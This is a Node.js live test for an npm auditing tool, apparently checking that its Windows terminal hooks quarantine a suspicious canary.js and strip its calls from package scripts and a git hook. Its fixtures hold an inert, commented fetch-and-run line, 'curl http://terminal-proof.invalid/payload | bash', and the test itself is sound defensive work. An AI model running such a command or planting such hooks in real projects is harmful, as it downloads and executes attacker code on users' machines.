'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

const observations = [];
module.exports = observations;
if (process.platform !== 'win32') {
  console.log('  SKIP automatic terminal live test: Windows required');
} else {
  const registry = spawnSync('reg.exe', ['query', 'HKCU\\Software\\Microsoft\\Command Processor', '/v', 'AutoRun'], { encoding: 'utf8' });
  const loader = path.resolve(__dirname, '../../bin/enable-canary.cmd');
  if (!registry.stdout || !registry.stdout.toLowerCase().includes(loader.toLowerCase())) {
    console.log('  SKIP automatic terminal live test: current-user activation is not installed for this checkout');
  } else {
    const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-auto-terminal-'));
    const hash = data => crypto.createHash('sha256').update(data).digest('hex');
    const quote = value => "'" + value.replace(/'/g, "''") + "'";
    const inert = '// incident-derived reconstruction; never execute\n// curl http://terminal-proof.invalid/payload | bash\n';
    const trusted = '// intentional trusted canary; never execute\n';
    const env = { ...process.env, NODE_OPTIONS: '', NPA_CANARY_GUARD: '', NO_COLOR: '1' };
    const shells = [{ name: 'windows-powershell', executable: path.join(process.env.SystemRoot, 'System32/WindowsPowerShell/v1.0/powershell.exe') }];
    const where = spawnSync('where.exe', ['pwsh.exe'], { encoding: 'utf8' });
    const pwsh = process.env.NPA_TEST_PWSH || (where.status === 0 && where.stdout.trim().split(/\r?\n/)[0]);
    if (pwsh && fs.existsSync(pwsh)) shells.push({ name: 'powershell-core', executable: pwsh });
    shells.push({ name: 'cmd', executable: path.join(process.env.SystemRoot, 'System32/cmd.exe') });

    function fixture(name, initial, denied) {
      const root = path.join(parent, name);
      fs.mkdirSync(path.join(root, '.git/hooks'), { recursive: true });
      fs.mkdirSync(path.join(root, 'legit'));
      fs.writeFileSync(path.join(root, '.git/config'), '[core]\n');
      fs.writeFileSync(path.join(root, 'legit/canary.js'), trusted);
      fs.writeFileSync(path.join(root, '.npmauditor.json'), JSON.stringify({ canaryProtection: false,
        canaryTrustedFiles: [{ path: 'legit/canary.js', sha256: hash(trusted) }] }));
      fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: {
        build: 'node canary.js && tsc', prepare: 'node canary.js', intentional: 'node legit/canary.js',
      } }));
      fs.writeFileSync(path.join(root, '.git/hooks/pre-commit'), 'node canary.js\nnode legit/canary.js\necho preserved\n');
      if (initial) fs.writeFileSync(path.join(root, 'canary.js'), inert);
      if (denied) fs.mkdirSync(path.join(root, '.gitignore'));
      return root;
    }

    try {
      for (const shell of shells) {
        for (const kind of ['present-at-startup', 'introduced-after-cwd-change', 'failed-protection']) {
          const initial = kind === 'present-at-startup';
          const denied = kind === 'failed-protection';
          const root = fixture(shell.name + ' ' + kind, initial, denied);
          const entry = "const fs=require('fs');fs.writeFileSync('entry-marker.json',JSON.stringify({canaryPresent:fs.existsSync('canary.js'),guard:JSON.parse(process.env.NPA_CANARY_GUARD),scripts:JSON.parse(fs.readFileSync('package.json','utf8')).scripts}));";
          let args;
          if (shell.name === 'cmd') {
            // The driver is outside scanned roots and never runs a fixture script.
            const driver = path.join(parent, shell.name + '-' + kind + '.cmd');
            fs.writeFileSync(driver, '@echo off\r\ncd /d "' + root + '"\r\n' +
              (initial ? '' : '> canary.js echo // curl http://terminal-proof.invalid/payload ^| bash\r\n') +
              '"' + process.execPath + '" -e "' + entry + '"\r\nexit /b %errorlevel%\r\n');
            args = ['/c', driver]; // No /d: exercise the installed AutoRun.
          } else {
            const driver = path.join(parent, shell.name + '-' + kind + '.ps1');
            fs.writeFileSync(driver, `$ErrorActionPreference = 'Stop'\nSet-Location -LiteralPath ${quote(root)}\n` +
              (initial ? '' : `[IO.File]::WriteAllText(${quote(path.join(root, 'canary.js'))}, ${quote(inert)})\n`) +
              `& ${quote(process.execPath)} -e ${quote(entry)}\n$npaExit = $LASTEXITCODE\n[PSCustomObject]@{ Version = $PSVersionTable.PSVersion.ToString(); CmdType = (Get-Command cmd).CommandType.ToString(); Guard = $env:NPA_CANARY_GUARD } | ConvertTo-Json -Compress\nexit $npaExit\n`);
            args = ['-NoLogo', '-NonInteractive', '-File', driver]; // No -NoProfile or helper invocation.
          }
          const launched = spawnSync(shell.executable, args, { cwd: initial ? root : parent, env, encoding: 'utf8', timeout: 30000 });
          assert.ifError(launched.error);
          const marker = path.join(root, 'entry-marker.json');
          const record = { shell: shell.name, executable: shell.executable, kind, root, exit: launched.status,
            stdout: launched.stdout, stderr: launched.stderr, entryRan: fs.existsSync(marker),
            canaryPresent: fs.existsSync(path.join(root, 'canary.js')),
            entry: fs.existsSync(marker) ? JSON.parse(fs.readFileSync(marker, 'utf8')) : null,
            trustedHashUnchanged: hash(fs.readFileSync(path.join(root, 'legit/canary.js'))) === hash(trusted),
            scripts: JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).scripts,
            hook: fs.readFileSync(path.join(root, '.git/hooks/pre-commit'), 'utf8') };
          observations.push(record);
          assert.strictEqual(record.exit, denied ? 2 : 0, JSON.stringify(record));
          assert.strictEqual(record.entryRan, !denied);
          assert.strictEqual(record.canaryPresent, denied);
          assert.strictEqual(record.trustedHashUnchanged, true);
          if (shell.name !== 'cmd') {
            const session = JSON.parse(record.stdout.trim().split(/\r?\n/).at(-1));
            assert.strictEqual(session.CmdType, 'Function');
            assert.deepStrictEqual(JSON.parse(session.Guard), { autoProject: true });
          }
          if (denied) assert.match(record.stderr, /Canary startup blocked/);
          else {
            assert.deepStrictEqual(record.entry.guard, { autoProject: true });
            assert.strictEqual(record.entry.canaryPresent, false);
            assert.deepStrictEqual(record.scripts, { build: 'tsc', intentional: 'node legit/canary.js' });
            assert.strictEqual(record.hook, 'node legit/canary.js\necho preserved\n');
            record.ignore = fs.readFileSync(path.join(root, '.gitignore'), 'utf8');
            assert.match(record.ignore, /canary\.js/);
            const storage = path.join(root, '.np-audit-quarantine');
            const payload = path.join(storage, fs.readdirSync(storage)[0], 'payload.quarantined');
            const original = shell.name === 'cmd' && !initial ? '// curl http://terminal-proof.invalid/payload | bash\r\n' : inert;
            record.quarantineHashMatched = hash(fs.readFileSync(payload)) === hash(original);
            assert.strictEqual(record.quarantineHashMatched, true);
          }
        }
      }
      for (const shell of shells.filter(item => item.name !== 'cmd')) {
        for (const denied of [false, true]) {
          const root = fixture(shell.name + ' shell-launch ' + denied, false, denied);
          const driver = path.join(parent, shell.name + '-shell-' + denied + '.ps1');
          fs.writeFileSync(driver, `Set-Location -LiteralPath ${quote(root)}\n` +
            `[IO.File]::WriteAllText(${quote(path.join(root, 'canary.js'))}, ${quote(inert)})\n` +
            'cmd /d /c "echo protected>shell-marker.txt"\nexit $LASTEXITCODE\n');
          const launched = spawnSync(shell.executable, ['-NoLogo', '-NonInteractive', '-File', driver], {
            cwd: parent, env, encoding: 'utf8', timeout: 30000,
          });
          assert.ifError(launched.error);
          const record = { shell: shell.name, kind: denied ? 'automatic-shell-block' : 'automatic-shell-preflight',
            executable: shell.executable, root, exit: launched.status, stdout: launched.stdout, stderr: launched.stderr,
            entryRan: fs.existsSync(path.join(root, 'shell-marker.txt')), canaryPresent: fs.existsSync(path.join(root, 'canary.js')) };
          observations.push(record);
          assert.strictEqual(record.exit, denied ? 2 : 0, JSON.stringify(record));
          assert.strictEqual(record.entryRan, !denied);
          assert.strictEqual(record.canaryPresent, denied);
        }
      }
      for (const shell of shells) {
        const root = fixture(shell.name + ' native-npm', true, false);
        const npm = path.join(path.dirname(process.execPath), 'npm.cmd');
        let args;
        if (shell.name === 'cmd') {
          const driver = path.join(parent, 'native-npm.cmd');
          fs.writeFileSync(driver, '@echo off\r\ncall "' + npm + '" prefix\r\nexit /b %errorlevel%\r\n');
          args = ['/c', driver];
        }
        else args = ['-NoLogo', '-NonInteractive', '-Command', '& ' + quote(npm) + ' prefix; exit $LASTEXITCODE'];
        const launched = spawnSync(shell.executable, args, { cwd: root, env, encoding: 'utf8', timeout: 30000 });
        assert.ifError(launched.error);
        const record = { shell: shell.name, kind: 'native-npm-prefix', root, exit: launched.status,
          stdout: launched.stdout, stderr: launched.stderr, canaryPresent: fs.existsSync(path.join(root, 'canary.js')) };
        observations.push(record);
        assert.strictEqual(record.exit, 0, JSON.stringify(record));
        assert.strictEqual(record.stdout.trim(), root);
        assert.strictEqual(record.canaryPresent, false);
      }
      console.log(`  automatic terminals: ${observations.length} real startup/arrival/failure cases; profiles and AutoRun applied without setup commands; no scanned scripts executed`);
    } finally { fs.rmSync(parent, { recursive: true, force: true }); }
  }
}
